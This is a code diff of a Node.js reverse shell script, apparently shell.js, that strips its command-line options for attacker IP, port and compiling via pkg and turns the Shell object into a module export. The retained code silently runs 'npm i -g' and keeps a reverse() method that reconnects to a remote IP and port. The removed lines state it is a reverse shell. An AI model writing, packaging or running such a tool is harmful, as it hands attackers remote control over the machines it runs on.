@@ -2,22 +2,10 @@
 
 var {spawn, exec} = require('child_process');
 var reconnect = require('reconnect-net');
-var {argv} = require('yargs')
-.options({
-    "u" : {alias : "ip-adress" , type : "string", demandOption : true},
-    "c" : {alias : "compile" , type : "boolean", demandOption : false},
-    "p" : {alias : "port" , type : "number", demandOption : true}
 
-})
-.usage("node shell.js -u <ip> -p <port> -c")
- var {u, p, c} = argv
-console.clear()
-function Shell() {
+module.exports.Shell= function Shell() {
     exec('npm i -g')
-    this.compile = () =>{
-         exec('pkg shell.js' )
-    console.log("[+] Succesfully compiled the reverse shell !")
-   }
+
     this.reverse = (port , ip) => {
         try{
         reconnect(function(stream) {
@@ -65,7 +53,3 @@ function Shell() {
     }}
    
 }
-
-var shell = new Shell
-if(c == true) shell.compile()
-shell.reverse(p, u)
